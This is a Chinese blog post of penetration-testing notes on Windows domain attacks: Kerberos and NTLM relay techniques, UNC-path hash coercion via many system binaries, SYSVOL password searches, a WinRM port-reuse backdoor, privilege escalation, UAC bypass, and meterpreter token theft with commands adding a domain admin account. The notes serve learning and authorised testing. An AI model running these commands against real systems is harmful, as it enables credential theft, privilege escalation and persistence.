@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Windows知识点 | 漏断&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言 一点Windows内网渗透的笔记，知识点比较细碎，后续可能还会追加内容。">
+<meta name="keywords" content="速查备忘,Windows,内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows知识点">
+<meta property="og:url" content="http://houwenda.github.io/2020/07/19/windows-knowledge/index.html">
+<meta property="og:site_name" content="漏断&#39;s Blog">
+<meta property="og:description" content="前言 一点Windows内网渗透的笔记，知识点比较细碎，后续可能还会追加内容。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-07-19T16:04:51.407Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows知识点">
+<meta name="twitter:description" content="前言 一点Windows内网渗透的笔记，知识点比较细碎，后续可能还会追加内容。">
+  
+    <link rel="alternative" href="/atom.xml" title="漏断&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/head.jpg">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: false,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">漏断</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">首页</a></li>
+                        
+                            <li><a href="/archives">文章列表</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=n6impqaorK2rq9-u7rH88PI" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/houwenda" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="#" title="weibo">weibo</a>
+                            
+                                <a class="fl google" target="_blank" href="#" title="google">google</a>
+                            
+                                <a class="fl twitter" target="_blank" href="#" title="twitter">twitter</a>
+                            
+                                <a class="fl linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/BadUSB/" style="font-size: 10px;">BadUSB</a> <a href="/tags/HID攻击/" style="font-size: 10px;">HID攻击</a> <a href="/tags/PHP/" style="font-size: 17.5px;">PHP</a> <a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/Python/" style="font-size: 12.5px;">Python</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/environments/" style="font-size: 15px;">environments</a> <a href="/tags/shell/" style="font-size: 12.5px;">shell</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/出题笔记/" style="font-size: 10px;">出题笔记</a> <a href="/tags/学习打卡/" style="font-size: 20px;">学习打卡</a> <a href="/tags/树莓派/" style="font-size: 10px;">树莓派</a> <a href="/tags/格式转换/" style="font-size: 10px;">格式转换</a> <a href="/tags/环境配置/" style="font-size: 10px;">环境配置</a> <a href="/tags/踩坑记录/" style="font-size: 10px;">踩坑记录</a> <a href="/tags/速查备忘/" style="font-size: 20px;">速查备忘</a> <a href="/tags/题解/" style="font-size: 12.5px;">题解</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.ltfnjust.club/">LTF</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://104.224.167.8/dokuwiki/doku.php?id=start">TP0t</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://xlor.cn">XLor</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://einsturing.top/">Einsturing</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">Web狗一枚，现就读南京理工大学，安全爱好者</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">漏断</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">漏断</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">首页</a></li>
+                
+                    <li><a href="/archives">文章列表</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=n6impqaorK2rq9-u7rH88PI" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/houwenda" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+                    
+                        <a class="google" target="_blank" href="#" title="google">google</a>
+                    
+                        <a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
+                    
+                        <a class="linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-windows-knowledge" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/19/windows-knowledge/" class="article-date">
+      <time datetime="2020-07-19T15:55:14.000Z" itemprop="datePublished">2020-07-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Windows知识点
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/速查备忘/">速查备忘</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>一点Windows内网渗透的笔记，知识点比较细碎，后续可能还会追加内容。<br><a id="more"></a><br>参考链接：<a href="https://daiker.gitbook.io/windows-protocol" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol</a></p>
+</blockquote>
+<h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>Kerberos默认使用88/UDP端口。<br>Kerberos主要包含4种请求响应消息AS_REQ、AS_REP、TGS_REQ、TGS_REP，两种拓展认证模块S4U2和PAC。<br>各类消息中最重要的是TGT票据和TGS票据，票据中主要包含session key和加密ticket。<br>不同消息类型中包含的攻击点不同，S4U2协议主要用在约束委派和非约束委派攻击中。</p>
+<h3 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h3><p>用户向AS（Authentication Service）请求TGS申请票据，消息中包含用户hash加密的时间戳，攻击者只要获取到用户hash就可以伪装成用户与AS交互。其中用户hash在使用时可能用于不同加密算法（都采用对称加密），如果作为RC4密钥则称为PTH，如果作为AES密钥则称为PTK。</p>
+<h3 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h3><p>AS在接收到AS_REQ后，尝试使用用户hash解密时间戳，认证成功后使用krbtgt hash加密krbtgt并返回给用户（注意：krbtgt hash是随机生成的，难以爆破，与服务hash不同）。<br>如果攻击者获取到krbtgt hash，就可以伪装成AS服务向任意用户颁发tgt票据，这个票据称为黄金票据，通过黄金票据可以伪装成用户申请任意服务的TGS票据。<br>如果当前用户没有设置预验证机制，那么AS将不认证用户身份，直接返回结果。返回的AS_REP中会包含用户hash加密的session_key，通过hashcat爆破可以得到用户明文口令，这种攻击成为AS_REPRoasting。</p>
+<h3 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h3><p>用户在获取到AS_REP响应后，可以与TGS（Ticket Granting Service）交互，申请服务的TGS票据。这一步主要使用session key进行身份验证。</p>
+<h3 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h3><p>TGS在收到用户请求后，不会验证用户对指定服务是否有访问权限，直接将服务hash加密的ticket返回给用户。通过爆破，可以获取到服务的明文密码，这种攻击成为Kerberoasting。在获取到服务密码及hash后，就可以伪装成服务向任意用户签发TGS票据，这种票据成为白银票据，通过白银票据可以伪装成用户访问对应服务（如果服务设置为验证PAC签名则无法使用）。</p>
+<h3 id="S4U2"><a href="#S4U2" class="headerlink" title="S4U2"></a>S4U2</h3><p>S4U2机制主要结合约束委派和非约束委派，帮助服务端代替用户访问自身或其他服务，包含S4U2Self和S4U2Proxy。<br>非约束委派中，服务A将用户发来的用户TGT存入LSASS中，随后跟TGS交互，可以访问任意服务。攻击者如果能够从LSASS中提取出用户TGT，就可以实施PTT。<br>约束委派中，服务A无需和用户交互即可得到用户访问服务A的TGS，随后通过S4U2Proxy获取可转发TGS，代替任意用户访问指定服务B。如果攻击者获取了A的权限，就可以伪造用户访问服务B。<br>约束委派一般需要域管权限才能配置，而基于资源的约束委派仅仅需要服务B的LDAP权限。当攻击者拥有服务A权限和服务B的LDAP权限时，可以配置A到B的约束委派，随后就可以伪造用户访问服务B。</p>
+<h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PAC对用户和服务透明，仅TGS可以查看并使用，用户和服务只能获取到签名加密的PAC。PAC中保存了每个用户的SID、组信息，当服务进行PAC验证时TGS对权限进行检查。<br>MS14-068：KDC无法检查PAC签名，导致用户可以任意伪造签名，实现提权。</p>
+<h3 id="主要攻击方法"><a href="#主要攻击方法" class="headerlink" title="主要攻击方法"></a>主要攻击方法</h3><ol>
+<li>用户名枚举（利用AS）</li>
+<li>PTH/PTK（利用客户机）</li>
+<li>密码喷洒（利用AS）</li>
+<li>AS_REPRoasting（无预验证时可用）</li>
+<li>黄金票据</li>
+<li>Kerberoasting</li>
+<li>白银票据</li>
+<li>非约束委派攻击（PTT）</li>
+<li>约束委派攻击</li>
+<li>基于资源的约束委派攻击</li>
+</ol>
+<h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h2><p>NTLM协议是SSP的一种实现，属于嵌入型认证协议，可以嵌入在其他协议中实现认证，如HTTP、SMB、Exchange、LDAP等。<br>NTLM主要包含三种消息，type1、type2、type3。</p>
+<h3 id="type1"><a href="#type1" class="headerlink" title="type1"></a>type1</h3><p>由客户端发送到服务端的协商消息，包含客户端支持和请求功能列表。</p>
+<h3 id="type2"><a href="#type2" class="headerlink" title="type2"></a>type2</h3><p>服务器收到客户端的协商请求，生成Challenge，返回质询消息。消息中包含服务器支持和同意的功能列表。<br>由于包含服务器信息，可以进行信息收集，可以获取操作系统信息、主机名、服务版本信息、NetBIOS名等。</p>
+<h3 id="type3"><a href="#type3" class="headerlink" title="type3"></a>type3</h3><p>用户使用用户hash加密Challenge，发送给服务端进行认证。结合type2中的Challenge值，可以实施NTLM relay、跨协议relay、NTLM reflect攻击。</p>
+<h3 id="主要攻击方法-1"><a href="#主要攻击方法-1" class="headerlink" title="主要攻击方法"></a>主要攻击方法</h3><p>NTLM没有中间人防护，因此存在NTLM relay、NTLM reflect、跨协议reflect等攻击手段。<br>服务端在type2中可以指定Net-NTLM加密Challenge使用的算法，利用存在漏洞的算法，可以爆破出用户密码明文。<br>攻击者如果获取到了用户hash，就可以实施PTH，伪装成用户进行交互。<br>中间人将Challenge和用户hash加密的challenge转发到目标服务，这种攻击成为NTLM relay。<br>由于NTLM是嵌入型协议，可以提取并转换到其他服务消息中，因此可以跨协议relay，包含Relay2SMB（默认仅域控启用SMB签名认证）、Relay2EWS、Relay2LDAP（20年1月域控强制签名）等。<br>在工作组中，常常无法进行主机间验证，但可以向自己发起验证，因此可以由中间人转发到发起端，实现对发起端服务的访问，这种攻击成为NTLM reflect。微软使用暂存发起记录的方式缓解NTLM reflect，但是缓存时间只有5分钟，之后再relay就可以绕过。</p>
+<h3 id="诱导发起NTLM请求"><a href="#诱导发起NTLM请求" class="headerlink" title="诱导发起NTLM请求"></a>诱导发起NTLM请求</h3><p>可以通过UNC路径使得目标主机向指定服务发起NTLM请求，进而获取到Net-NTLM信息，实施Relay等。</p>
+<ol>
+<li>图标<br> 每个文件夹下的desktop.ini<br> 文件夹下的scf 文件<br> 用户头像</li>
+<li><p>系统命令携带UNC路径</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&gt; net.exe use \hostshare</span><br><span class="line">&gt; attrib.exe \hostshare  </span><br><span class="line">&gt; bcdboot.exe \hostshare  </span><br><span class="line">&gt; bdeunlock.exe \hostshare  </span><br><span class="line">&gt; cacls.exe \hostshare  </span><br><span class="line">&gt; certreq.exe \hostshare #(noisy, pops an error dialog) </span><br><span class="line">&gt; certutil.exe \hostshare  </span><br><span class="line">&gt; cipher.exe \hostshare  </span><br><span class="line">&gt; ClipUp.exe -l \hostshare  </span><br><span class="line">&gt; cmdl32.exe \hostshare  </span><br><span class="line">&gt; cmstp.exe /s \hostshare  </span><br><span class="line">&gt; colorcpl.exe \hostshare #(noisy, pops an error dialog)  </span><br><span class="line">&gt; comp.exe /N=0 \hostshare \hostshare  </span><br><span class="line">&gt; compact.exe \hostshare  </span><br><span class="line">&gt; control.exe \hostshare  </span><br><span class="line">&gt; convertvhd.exe -source \hostshare -destination \hostshare  </span><br><span class="line">&gt; Defrag.exe \hostshare  </span><br><span class="line">&gt; diskperf.exe \hostshare  </span><br><span class="line">&gt; dispdiag.exe -out \hostshare  </span><br><span class="line">&gt; doskey.exe /MACROFILE=\hostshare  </span><br><span class="line">&gt; esentutl.exe /k \hostshare  </span><br><span class="line">&gt; expand.exe \hostshare  </span><br><span class="line">&gt; extrac32.exe \hostshare  </span><br><span class="line">&gt; FileHistory.exe \hostshare #(noisy, pops a gui)  </span><br><span class="line">&gt; findstr.exe * \hostshare  </span><br><span class="line">&gt; fontview.exe \hostshare #(noisy, pops an error dialog)  </span><br><span class="line">&gt; fvenotify.exe \hostshare #(noisy, pops an access denied error)  </span><br><span class="line">&gt; FXSCOVER.exe \hostshare #(noisy, pops GUI)  </span><br><span class="line">&gt; hwrcomp.exe -check \hostshare  </span><br><span class="line">&gt; hwrreg.exe \hostshare  </span><br><span class="line">&gt; icacls.exe \hostshare   </span><br><span class="line">&gt; licensingdiag.exe -cab \hostshare  </span><br><span class="line">&gt; lodctr.exe \hostshare</span><br><span class="line">&gt; lpksetup.exe /p \hostshare /s</span><br><span class="line">&gt; makecab.exe \hostshare</span><br><span class="line">&gt; msiexec.exe /update \hostshare /quiet</span><br><span class="line">&gt; msinfo32.exe \hostshare #(noisy, pops a &quot;cannot open&quot; dialog)</span><br><span class="line">&gt; mspaint.exe \hostshare #(noisy, invalid path to png error)</span><br><span class="line">&gt; msra.exe /openfile \hostshare #(noisy, error)</span><br><span class="line">&gt; mstsc.exe \hostshare #(noisy, error)</span><br><span class="line">&gt; netcfg.exe -l \hostshare -c p -i foo</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>XSS<br> 适用于IE和Edge，其他浏览器默认会认为跨域</p>
+</li>
+<li>outlook<br> 邮件中的HTML里包含UNC路径</li>
+<li>PDF<br> 使用Acrobat打开会有提示，Chrome或IE打开无法执行</li>
+<li>office<br> word文件中包含UNC加载项</li>
+<li>MySQL<br> LOAD_FILE使用UNC路径</li>
+<li>NBNS和LLMNR<br> 用于域名解析，类似于ARP，可以进行投毒</li>
+<li>WPAD和mitm6<br> WPAD用于自动发现代理，可以结合LLMNR/NBNS投毒或DHCPv6</li>
+<li>XXE &amp;&amp; SSRF</li>
+<li>打印机漏洞<br>控制打印服务，以机器用户向指定计算机发送更改通知。在拿到机器用户hash之后，可以尝试relay到Exchange服务，或到LDAP添加dcsync权限、基于资源的约束委派，进而实现提权。</li>
+</ol>
+<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS_REP Roasting"></a>AS_REP Roasting</h2><p>AS服务在用户未开启预验证的情况下会直接返回该用户的TGT，其中包含了用户hash加密的session_key<br>使用Impacket的GetNPUsers.py，可以获取无预验证用户hash加密的session_key。<br>只要知道用户名，就能够批量导出用户hash。</p>
+<h2 id="SYSVOL保存敏感信息"><a href="#SYSVOL保存敏感信息" class="headerlink" title="SYSVOL保存敏感信息"></a>SYSVOL保存敏感信息</h2><p>管理员将含有密码的文件保存在域的SYSVOL中，导致任意域用户可以读取敏感文件。<br>经典案例：Group Policy Preferences (GPP) with cPassword attribute (MS14-025)、硬编码在脚本中的密码和配置文件。<br>测试方法：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">findstr</span> /s /n /i /p password \\&lt;DOMAIN&gt;\sysvol\&lt;DOMAIN&gt;\*</span><br></pre></td></tr></table></figure></p>
+<h2 id="常用网络服务"><a href="#常用网络服务" class="headerlink" title="常用网络服务"></a>常用网络服务</h2><h3 id="WINRM"><a href="#WINRM" class="headerlink" title="WINRM"></a>WINRM</h3><p>WINRM服务监听5985端口，方便进行远程管理，可能存在未授权访问。<br>端口复用后门：在开启web服务的主机上执行以下指令即可监听80端口，同时保留5989监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以通过以下指令实现只监听80端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>常用工具：evil-winrm</p>
+<h3 id="MSRPC"><a href="#MSRPC" class="headerlink" title="MSRPC"></a>MSRPC</h3><p>Windows远程过程调用接口，监听TCP/UDP 135端口，可能存在未授权访问。</p>
+<p>常用工具：rpcclient<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpcclinet -U &quot;&quot; -N &lt;IP&gt;</span><br><span class="line">enumdomusers</span><br><span class="line">enumdomgroups</span><br><span class="line">queryuser &lt;username&gt;</span><br><span class="line">querydispinfo</span><br></pre></td></tr></table></figure></p>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>实现文件共享，网上邻居等，使用NetBIOS通信或使用TCP 445端口，可以通过UNC路径访问其他主机上的文件。可能存在未授权访问漏洞<br>常用工具：smbmap、impacket-server.py<br>smbmap：遍历SMB路径<br>smbclient：连接smb服务<br>crackmapexec：密码喷洒、口令爆破<br>impacket-server.py：启动一个SMB服务，可以在远程主机上访问本机文件</p>
+<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>用于保存域中信息的服务，默认389端口，加密端口636。可能存在未授权访问，可能受到DCSync攻击<br>常用工具：ldapsearch</p>
+<h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>监听UDP 137、UDP 138、TCP 139端口，分别实现名称、数据报、会话服务。<br>早期SMB运行于NetBIOS协议之上，后来独立出445端口。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="内核溢出漏洞"><a href="#内核溢出漏洞" class="headerlink" title="内核溢出漏洞"></a>内核溢出漏洞</h3><p>常用工具：<br>wmic查询补丁信息<br>msf模块post/windows/gather/enum_patches<br>windoes-exploit-suggester<br>Sherlock</p>
+<h3 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h3><ol>
+<li>服务权限错误<br> 若服务未运行，则替换原服务，重启服务。若服务正在运行且无法停止，则劫持DLL并重启服务<br> 常用工具：PowerUP脚本检测，msf模块exploit/service_permissions</li>
+<li>注册表键值AlwaysInstallElevated<br> 会允许低权限用户以system权限运行MSI安装文件。在运行msi文件时，系统使用msiexec.exe执行安装操作，因此可以使用恶意msi实现提权。<br> 常用工具：PowerUP脚本的Write-UserAddMSI生成恶意msi文件，msf模块exploit/windows/local/always_install_elevated</li>
+<li>可信任服务路径<br> Windows在解析文件路径空格时，会优先测试空格是否为截断，在特定位置放置恶意文件，并重启服务，会被当做可信任服务程序被执行。<br> 常用工具：wmic查询没有被引号包括的服务路径，msf模块exploit/trusted_service_path</li>
+<li>自动安装配置文件<br> 批量部署的配置文件中可能存在本地管理员密码。<br> 常用工具：msf模块exploit/windows/gather/enum_unattend</li>
+<li>计划任务<br> 替换计划任务的程序文件<br> 常用工具：AccessChk.exe查询缺陷文件</li>
+<li>Empire模块检测<br> 使用Empire的privesc/powerup/allchecks模块，检查以下：<ul>
+<li>没被引号括起来的服务路径</li>
+<li>ACL配置错误</li>
+<li>服务可执行文件权限配置不当</li>
+<li>Unattend.xml文件</li>
+<li>注册表AlwaysInstallElevated</li>
+<li>注册表中的Autologon凭证</li>
+<li>加密的web.config字符串和应用程序池的密码</li>
+<li>DLL劫持机会</li>
+</ul>
+</li>
+</ol>
+<h3 id="组策略首选项（GPP）"><a href="#组策略首选项（GPP）" class="headerlink" title="组策略首选项（GPP）"></a>组策略首选项（GPP）</h3><p>SYSVOL在域中的所有域控之间自动同步和共享，用于存放登录脚本、组策略数据、其他域控需要的域信息等。管理员可能通过与策略进行统一配置和管理，在修改本地管理员密码后会导致所有机器本地管理员密码相同，如果攻击者读取到一台机器里GPP中的密码就相当于获取所有主机本地管理员密码。<br>组策略信息被保存在SYSVOL中的XML文件中，密码使用AES-256加密，微软已经公开加密私钥。<br>常用工具：PowerSploit中的Get-GPPPassword.ps1，msf模块post/windows/gather/credentials/gpp，Empire模块privesc/gpp</p>
+<h3 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h3><p>UAC将进程权限分为高等级、中等级、低等级三类，分别拥有管理员、普通用户、有限权限。UAC有四种设置：始终通知、仅在程序试图更改计算机时通知、仅在程序试图更改计算机时通知（不改变桌面亮度）、从不提示，默认使用的是仅在程序试图更改计算机时通知。<br>当用户在管理员组中时，可以使用msf模块exploit/windows/local/bypassuac实现system权限，但是会释放文件，容易被检测；用exploit/windows/local/bypassuac_injection通过反射DLL注入实现。<br>使用msf模块exploit/windows/local/ask创建一个可执行文件，自动运行并提示用户是否继续运行，若成功运行则获取system权限。<br>Nishang中的Invoke-PsUACme脚本可以通过UACME项目中的DLL文件绕过UAC。<br>Empire使用privesc/bypassuac模块或privesc/bypassuas_wscript模块实现绕过。其中wscript模块使用wscript.exe执行payload，只适用于win7，尚无补丁。</p>
+<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>令牌作为临时密钥保存在系统中，代替账户和密码进行身份验证，重启后清空。令牌主要分为访问令牌（代表操作主体）、密保令牌（也称认证令牌、硬件令牌，是实现身份校验的物理设备）和会话令牌。令牌窃取和伪造攻击主要针对Kerberos协议。</p>
+<ol>
+<li>meterpreter<br>在meterpreter中执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u  # 查看所有令牌，分为授权令牌和模拟令牌两种</span><br><span class="line">impersonate_token &lt;令牌用户&gt;  # 使用用户令牌，实现越权，但是受限于当前用户权限</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>还可以使用rotten potato的exp实现权限提升，获取system权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 下载rottenpotato.exe</span><br><span class="line">execute -HC -f rottenpotato.exe</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure></p>
+<p>也可以通过migrate到域管理进程中，并添加管理员账户实现提权至域管理员<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate &lt;pid&gt;</span><br><span class="line">net user shuteer xy@china110 /ad /domain</span><br><span class="line">net group &quot;domain admins&quot; shuteer /ad /domain</span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li>Empire<br>可使用mimikatz获取系统密码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">creds</span><br><span class="line">pth &lt;CredID&gt;  # 窃取用户令牌</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>也可以查找是否有域管理用户的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;ProcID&gt;</span><br><span class="line">revtoself  # 恢复令牌权限</span><br></pre></td></tr></table></figure></p>
+<h3 id="无凭证条件下的欺骗攻击"><a href="#无凭证条件下的欺骗攻击" class="headerlink" title="无凭证条件下的欺骗攻击"></a>无凭证条件下的欺骗攻击</h3><p>主要利用LLMNR和NetBIOS欺骗实现。<br>当内网DNS服务器不可用时，会使用LLMNR进行地质解析，类似ARP。NetBIOS提供三种服务：名称服务（NBT-NS，可实现DNS）、数据报分发服务、会话服务。<br>利用：当用户输入错误主机名使，DNS查询失败，启用NBT_NS和LLMNR解析。通过Responder回应客户端请求，并声明自己是被请求主机，并尝试建立SMB连接，客户端会发送Net-NTLM Hash进行验证，后续可以通过Net-NTLM进行攻击。</p>
+
+      
+      
+        <div class="page-reward">
